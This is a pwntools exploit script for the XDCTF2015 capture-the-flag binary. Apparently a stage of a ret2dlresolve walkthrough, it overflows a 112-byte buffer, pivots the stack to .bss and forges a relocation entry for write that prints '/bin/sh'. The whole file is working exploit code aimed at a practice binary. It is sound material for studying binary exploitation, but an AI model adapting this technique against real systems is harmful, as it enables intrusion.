from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()